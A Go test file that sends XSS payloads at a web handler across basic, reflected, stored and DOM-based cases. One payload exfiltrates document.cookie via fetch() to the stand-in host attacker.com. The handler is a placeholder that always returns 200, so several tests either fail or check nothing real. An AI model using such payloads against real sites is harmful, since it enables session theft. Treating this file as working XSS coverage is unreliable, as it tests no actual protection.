package application

import (
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestXSSVulnerabilities(t *testing.T) {
	// Test basic XSS payloads
	t.Run("Basic XSS", func(t *testing.T) {
		payloads := []string{
			"<script>alert('xss')</script>",
			"<img src=x onerror=alert('xss')>",
			"<svg onload=alert('xss')>",
			"javascript:alert('xss')",
		}

		for _, payload := range payloads {
			req := httptest.NewRequest("GET", "/api/test?input="+payload, nil)
			w := httptest.NewRecorder()
			handler := setupTestHandler()
			handler.ServeHTTP(w, req)

			assert.NotEqual(t, http.StatusOK, w.Code, "XSS payload should be blocked: %s", payload)
		}
	})

	// Test reflected XSS
	t.Run("Reflected XSS", func(t *testing.T) {
		payloads := []string{
			"<script>document.cookie</script>",
			"<img src=x onerror=fetch('http://attacker.com?cookie='+document.cookie)>",
			"<svg><script>alert('xss')</script></svg>",
		}

		for _, payload := range payloads {
			req := httptest.NewRequest("GET", "/api/search?q="+payload, nil)
			w := httptest.NewRecorder()
			handler := setupTestHandler()
			handler.ServeHTTP(w, req)

			body := w.Body.String()
			assert.NotContains(t, body, payload, "Reflected XSS payload should be sanitized: %s", payload)
		}
	})

	// Test stored XSS
	t.Run("Stored XSS", func(t *testing.T) {
		payloads := []string{
			"<script>localStorage.setItem('token', 'stolen')</script>",
			"<img src=x onerror=sendDataToAttacker()>",
			"<div onmouseover=alert('xss')>hover me</div>",
		}

		for _, payload := range payloads {
			// First, store the payload
			req := httptest.NewRequest("POST", "/api/comments", nil)
			req.Body = io.NopCloser(strings.NewReader(`{"content": "` + payload + `"}`))
			w := httptest.NewRecorder()
			handler := setupTestHandler()
			handler.ServeHTTP(w, req)

			// Then, retrieve and verify it's sanitized
			req = httptest.NewRequest("GET", "/api/comments", nil)
			w = httptest.NewRecorder()
			handler.ServeHTTP(w, req)

			body := w.Body.String()
			assert.NotContains(t, body, payload, "Stored XSS payload should be sanitized: %s", payload)
		}
	})

	// Test DOM-based XSS
	t.Run("DOM-based XSS", func(t *testing.T) {
		payloads := []string{
			"<script>eval(location.hash.slice(1))</script>",
			"<script>new Function(location.hash.slice(1))()</script>",
			"<script>setTimeout(location.hash.slice(1), 0)</script>",
		}

		for _, payload := range payloads {
			req := httptest.NewRequest("GET", "/api/test#"+payload, nil)
			w := httptest.NewRecorder()
			handler := setupTestHandler()
			handler.ServeHTTP(w, req)

			assert.NotEqual(t, http.StatusOK, w.Code, "DOM-based XSS payload should be blocked: %s", payload)
		}
	})

	// Test valid inputs that should not trigger XSS detection
	t.Run("Valid Inputs", func(t *testing.T) {
		validInputs := []string{
			"Hello, World!",
			"<p>This is a paragraph</p>",
			"<div class='container'>Content</div>",
			"<a href='https://example.com'>Link</a>",
		}

		for _, input := range validInputs {
			req := httptest.NewRequest("GET", "/api/test?input="+input, nil)
			w := httptest.NewRecorder()
			handler := setupTestHandler()
			handler.ServeHTTP(w, req)

			assert.Equal(t, http.StatusOK, w.Code, "Valid input should be accepted: %s", input)
		}
	})
}

func setupTestHandler() http.Handler {
	// Setup your test handler with XSS protection middleware
	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Simulate your application's request handling
		// In a real application, this would include your XSS protection middleware
		w.WriteHeader(http.StatusOK)
	})
	return handler
}
